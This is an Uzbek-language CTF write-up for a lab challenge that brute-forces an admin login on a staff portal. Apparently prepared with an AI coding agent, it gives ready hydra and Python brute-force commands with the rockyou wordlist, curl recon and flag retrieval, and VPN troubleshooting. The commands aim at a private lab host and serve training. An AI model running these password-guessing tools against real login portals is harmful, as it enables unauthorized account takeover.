# 04 · Brute Force: Staff Portal — yechim to'plami

**Challenge:** Acme staff portal, klassik POST login formasi, rate-limit yo'q.
Admin akkaunti paroli oddiy wordlist (rockyou) ichida bor. Username: `admin`.
**Target:** `http://10.15.1.54:9004/`  ← shu ishlaydigan IP (lab kartadagi mashina IP).
(`10.15.0.238` — challenge tavsifidagi manzil; ishlamasa, `10.15.1.54` bilan urining.)
**Qoidalar:** faqat **9004** portga hujum. Remote — boxda shell yo'q. Flag formati: `HTB{...}`.

---

## ⚠️ Muhim: tarmoq cheklovi (bu sandbox)

Bu CTF targeti **xususiy lab tarmog'ida** (`10.15.0.0/16`, HTB VPN).
Cline sandbox faqat ochiq internetga chiqadi (`example.com`, `google.com`,
`github.com` — 200 OK), ammo `10.15.0.238:9004` ga **route yo'q**
(ulanish filtering-proxy'ga tushib qayta reset bo'ladi, proxy yo'llari ham
timeout beradi). Shuning uchun bruteforce'ni **lab tarmog'iga ulangan
mashinadan** (HTB Pwnbox yoki o'z kompyuteringiz VPN bilan) yurgizing.
Quyidagi vositalar shu mashinada ishga tayyor.

---

## Papka tarkibi

| Fayl | Vazifasi |
|------|----------|
| `brute.py` | Python (faqat stdlib, `requests` shart emas) ko'p oqimli brute-forcer. CSRF token va cookie'larni ham biladi. |
| `hydra_run.sh` | `hydra http-post-form` bilan qisqa one-liner skript. |
| `wordlist.txt` | Kichik boshlang'ich ro'yxat (rockyou yo'q bo'lsa). |
| `mock_server.py` | Faqat **self-test** uchun lokal soxta login sahifa. |

---

## 1-qadam — Recon (formani o'rganish)

Hujumdan oldin formaning aniq maydon nomlari, `action` yo'li va **noto'g'ri
parolda chiqadigan matnni** aniqlang:

```bash
# Login sahifani ko'rish
curl -s -i http://10.15.1.54:9004/ | head -40

# Bitta xato urinish qilib, xato matnini topish
curl -s -i -X POST http://10.15.1.54:9004/login \
     -d 'username=admin&password=wrongpass' | head -40
```

Diqqat qilinadigan joylar:
- `<form method="POST" action="...">` → `LOGIN_PATH` (masalan `/` yoki `/login`)
- `<input name="...">` → username/password maydon nomlari
- Xato javobdagi matn, masalan `Invalid credentials` → `FAIL_STRING`

> Agar sahifada `<input type="hidden" name="csrf" ...>` bo'lsa — `hydra`ning
> oddiy rejimi qiyinlashadi; `brute.py` buni avtomatik o'qiydi (`--csrf-field`).

---

## 2-qadam — Hydra bilan brute force (tavsiya etiladi)

```bash
sudo apt-get install -y hydra wordlists        # rockyou: /usr/share/wordlists/rockyou.txt

# Aniq buyruq (LOGIN_PATH va FAIL_STRING ni recon natijasiga qarab o'zgartiring)
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      -s 9004 -t 8 -f -I -V \
      10.15.1.54 \
      http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
```

Yoki tayyor skript (default qiymatlar bilan):

```bash
cd ctf/brute-force-staff-portal
TARGET=10.15.0.238 PORT=9004 ./hydra_run.sh
```

- `-f` → birinchi topilgan parolda to'xtaydi
- `-V` → har bir urinishni ko'rsatadi (juda ko'p chiqsa olib tashlang)
- `F=Invalid` → noto'g'ri javob belgisi. Agar xato matni boshqacha bo'lsa o'zgartiring.
- Muvaffaqiyatda hydra yashil rangda `password: <PW>` qatorini chiqaradi.

> Eslatma: formada qo'shimcha yashirin maydon bo'lsa, formaga `&csrf=...`
> ko'rinishida qo'shing (odatda bu challenge'da CSRF yo'q).

---

## 3-qadam — Python fallback (`brute.py`)

Hydra o'rnatilmagan yoki CSRF/cookie bilan muammo bo'lsa:

```bash
cd ctf/brute-force-staff-portal

python3 brute.py \
  --url        http://10.15.1.54:9004/login \
  --login-page http://10.15.1.54:9004/ \
  --username   admin \
  --user-field username \
  --pass-field password \
  --wordlist   /usr/share/wordlists/rockyou.txt \
  --fail       "Invalid" \
  --threads    20
```

Foydali bayroqlar:

| Bayroq | Ma'nosi |
|--------|---------|
| `--fail STR` | Faqat **xato** javobda uchraydigan matn (hydra `F=`) |
| `--success STR` | Faqat **muvaffaqiyatli** javobda uchraydigan matn (masalan `HTB{`) — berilsa ustuvor |
| `--csrf-field NAME` | Yashirin token maydoni nomi (bir necha marta berish mumkin) |
| `--extra k=v` | Formaga qo'shimcha doimiy maydon |
| `--threads N` | Oqimlar soni (default 20) |
| `--insecure` | HTTPS'da sertifikatni tekshirmaslik |

Muvaffaqiyatda chiqadi:

```
[+] PASSWORD FOUND: <PAROL>
[+] login succeeded (HTTP 200, ...)
[+] evidence: ... HTB{...} ...
```

Exit code: `0` = topildi, `1` = topilmadi, `2` = xato.

---

## 4-qadam — Login qilib flagni olish

Parol topilgach, brauzer yoki curl bilan `admin` sifatida kiring va flagni oling:

```bash
PW='<TOPILGAN_PAROL>'
curl -s -c /tmp/cj -b /tmp/cj -L \
     -d "username=admin&password=$PW" \
     http://10.15.1.54:9004/login | grep -o 'HTB{[^}]*}'
```

Yoki brauzerda `http://10.15.0.238:9004/` → `admin` / `<parol>`.
Dashboard'da `HTB{...}` ko'rinadi. O'sha flagni "Submit Flag" maydoniga kiriting.

---

## Self-test (lokal, internetsiz)

`brute.py` to'g'ri ishlashini lab tarmog'isiz tekshirish:

```bash
cd ctf/brute-force-staff-portal
python3 mock_server.py 9004 &          # soxta portal: admin / summer2023
python3 brute.py --url http://127.0.0.1:9004/login \
                 --login-page http://127.0.0.1:9004/ \
                 --username admin --wordlist wordlist.txt \
                 --fail "Invalid" --threads 8
# kutilgan natija: [+] PASSWORD FOUND: summer2023
pkill -f mock_server.py
```

---

## Muammolarni bartaraf etish

### A) hydra `cannot connect` / `all children were disabled` — ENG KO'P UCHRAYDIGAN

Bu **tarmoq** muammosi, hydra yoki wordlist muammosi EMAS. Alomat:
```
[ERROR] Child with pid ... terminating, cannot connect
[ERROR] all children were disabled due too many connection errors
0 of 1 target completed, 0 valid password found
```
Ya'ni mashinangizdan `10.15.0.238:9004` ga **route yo'q** — HTB lab VPN
ulanmagan. Birinchi navbatda tekshiring:

```bash
cd ctf/brute-force-staff-portal
./connectivity_check.sh              # yoki: TARGET=10.15.1.54 ./connectivity_check.sh
```

`tun` interfeysi yo'q / TCP UNREACHABLE bo'lsa — VPN'ni **WSL ichida** ishga
tushiring (Windows'da emas — WSL2 NAT'i Windows VPN'ini ko'rmaydi):

```bash
# .ovpn faylini HTB'dan yuklab oling, so'ng WSL (Kali) ichida:
sudo openvpn --config ~/htb.ovpn
# "Initialization Sequence Completed" chiqishini kuting (terminalni yopmang)
```

Keyin boshqa terminalda:
```bash
ip a | grep tun                     # tun0 ko'rinishi kerak
nc -vz 10.15.0.238 9004             # "succeeded!" bo'lishi kerak
```

**Muqobil:** Windows OpenVPN ishlatmoqchi bo'lsangiz, WSL2'da mirrored
networking yoqing — `C:\Users\<siz>\.wslconfig` faylga:
```ini
[wsl2]
networkingMode=mirrored
```
so'ng PowerShell'da `wsl --shutdown`, WSL'ni qayta oching.

**Ikkinchi IP'ni ham sinab ko'ring:** challenge'da mashina IP `10.15.1.54`,
Target esa `10.15.0.238` deb yozilgan — ikkalasiga ham urinib ko'ring:
```bash
TARGET=10.15.1.54 PORT=9004 ./connectivity_check.sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 9004 -t 4 -f -I \
      10.15.1.54 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
```

### B) Hydra restore fayli haqida ogohlantirish
`[WARNING] Restorefile ... from a previous session found` — oldingi sessiya
qoldig'i. `-I` qo'shsangiz o'tkazib yuboradi:
`hydra -I -l admin -P ...`

### C) Ulanadi, lekin urinishlar "noto'g'ri" bo'lib qolsa
`FAIL_STRING` noto'g'ri. Recon'dagi haqiqiy xato matnini ishlating
(masalan `Invalid credentials`), yoki `--success 'HTB{'` bilan sinab ko'ring.

### D) Hydra 0 natija (lekin ulanadi)
Form maydon nomlari/`action` yo'li mos emas. `brute.py` bilan tekshiring —
u CSRF va cookie'ni o'zi boshqaradi:
`python3 brute.py --csrf-field csrf ...`

### E) 403 / blok
Formada CSRF bor: `brute.py --csrf-field csrf` ishlating.

### F) Judayam sekin
`-t` (hydra) yoki `--threads` (python) ni oshiring. Labda rate-limit yo'q.
Ammo "cannot connect" chiqsa, avval **A** bandini hal qiling.

### G) `brute.py: No such file or directory`
Skript GitHub'dagi repo ichida. Uni yuklab oling:
```bash
git clone https://github.com/dilshodgofurov161-ui/Global_AI_Server.git
# yoki faqat papkani: ctf/brute-force-staff-portal/
```
Yoki umuman kerak emas — **hydra A dan keyin yetarli**.


- **Barcha urinishlar "xato" bo'lsa** — `FAIL_STRING` noto'g'ri. Recon'dagi
  haqiqiy xato matnini ishlating, yoki `--success 'HTB{'` bilan urinib ko'ring.
- **Hydra 0 natija** — form maydon nomlari/`action` yo'li mos emas. `brute.py`
  bilan tekshiring (u CSRF va cookie'ni o'zi boshqaradi).
- **403 / blok** — formada CSRF bor; `brute.py --csrf-field csrf` ishlating.
- **Juda sekin** — `-t` (hydra) yoki `--threads` (python) ni oshiring. Labda
  rate-limit yo'q, shuning uchun xavfsiz.
